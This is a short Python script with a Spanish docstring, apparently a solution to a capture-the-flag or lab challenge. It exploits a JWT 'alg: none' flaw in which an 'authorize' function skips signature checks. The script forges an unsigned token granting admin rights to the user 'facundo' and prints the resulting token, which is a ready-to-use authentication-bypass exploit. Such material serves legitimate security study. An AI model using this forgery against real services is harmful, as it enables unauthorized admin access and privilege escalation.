import jwt
"""
En la funcion **authorize** se ve claramente que si algoritmo que se pasa en el JWT es 'none'
entonces no verifica la firma del token.
Por lo tanto, enviamos el siguiente Token:
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImZhY3VuZG8iLCJhZG1pbiI6dHJ1ZX0.
Generado por el siguiente codigo.
"""
encoded = jwt.encode(
    {
        "username": "facundo",
        "admin": True
    },
    None,
    algorithm="none"
)

print(str(encoded))